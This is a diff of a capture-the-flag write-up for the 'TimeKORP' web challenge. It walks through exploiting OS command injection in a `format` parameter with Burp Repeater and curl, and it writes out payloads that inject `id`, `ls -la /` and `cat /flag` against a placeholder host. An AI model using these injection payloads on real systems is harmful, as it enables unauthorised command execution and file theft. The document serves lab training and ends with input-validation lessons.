@@ -5,46 +5,84 @@
 - **Category:** Web
 - **Vulnerability:** OS Command Injection
 - **Parameter:** `format`
+- **Tool Used:** Burp Suite, cURL
 
 ## 🎯 Objective
 
 Identify and exploit an OS command injection vulnerability in the TimeKORP web application to retrieve the CTF flag.
 
-## 🔍 What Is Happening?
+## 🔍 Vulnerability Explanation
 
-The application uses PHP's `exec()` to execute a system command. The `format` parameter is passed into the command without proper protection, potentially allowing user input to execute unintended shell commands.
+The application processes user input from the `format` parameter to generate a time string. Insufficient input validation can allow specially crafted input to interfere with the server-side command and potentially execute unintended shell commands.
 
-## 💻 Solution — Terminal Commands
+## 💻 Solution 1 — Using Burp Suite
 
-### 1. Set the Target URL
+### Step 1: Intercept the Request
+
+- **Proxy → HTTP history**.
+- Find the request to the TimeKORP application.
+- Right-click the request and select **Send to Repeater**.
+
+### Step 2: Modify the Request
+
+Modify the `format` parameter with the following payload:
+
+```text
+?format=%25H%3A%25M%3A%25S%27%26cat%20../flag%26%27
+```
+
+The payload preserves the original time format and attempts to inject the `cat ../flag` command.
+
+### Step 3: Send the Request
+
+Click **Send** in Repeater to submit the modified request to the server.
+
+### Step 4: Retrieve the Flag
+
+Inspect the HTTP response body. The flag is returned if the injected command executes successfully and its output is included in the response.
+
+## 💻 Solution 2 — Using Terminal Commands
+
+### Step 1: Set the Target URL
 
 ```bash
 export TARGET='http://TARGET_HOST:TARGET_PORT'
 ```
 
-Stores the target URL in an environment variable for reuse in subsequent commands.
+Stores the target URL in an environment variable so it can be reused in subsequent commands. Replace the placeholder with the assigned CTF instance URL.
 
-### 2. Test Command Injection and Read the Flag
+### Step 2: Test Command Injection
 
 ```bash
-curl -sG "$TARGET/" --data-urlencode "format='; cat /flag; #"
+curl -sG "$TARGET/" --data-urlencode "format='; id; #"
 ```
 
-Sends a crafted GET request that attempts to inject a shell command and read the flag from `/flag`.
+Sends a GET request with a crafted `format` parameter to test whether shell command injection is possible.
 
-### 3. Investigate the Execution Context
+### Step 3: Investigate the Execution Environment
 
 ```bash
 curl -sG "$TARGET/" --data-urlencode "format='; id; ls -la /; cat /flag; #"
 ```
 
-Attempts to identify the execution context, list the root directory, and retrieve the flag.
+Attempts to display the command's execution identity, list the root directory, and read `/flag`. The file path may differ from the challenge's actual location.
 
-### 4. Extract the Flag
+### Step 4: Extract the Flag
 
 ```bash
 curl -sG "$TARGET/" --data-urlencode "format='; cat /flag; #" | grep -oE 'HTB\{[^}]+\}'
 ```
 
-Filters the response to display text matching the expected `HTB{...}` flag format.
+Filters the HTTP response for a flag matching the expected `HTB{...}` format. This works only if the command executes, the flag is at `/flag`, and the response contains the flag text.
 
+## 🧠 Key Takeaways
+
+- **OS Command Injection:** Can occur when untrusted input is incorporated into a shell command unsafely.
+- **Burp Suite Repeater:** Allows manual modification and resending of HTTP requests.
+- **cURL:** Sends HTTP requests directly from the terminal.
+- **`cat`:** Prints a file's contents.
+- **Input Validation:** Applications should avoid passing untrusted input into shell commands and use safer alternatives where possible.
+
+## ✅ Conclusion
+
+The TimeKORP challenge demonstrated how insufficient protection of user-controlled input can lead to OS command injection. Burp Suite Repeater helped modify the HTTP request, while the injected command was used to retrieve the CTF flag.
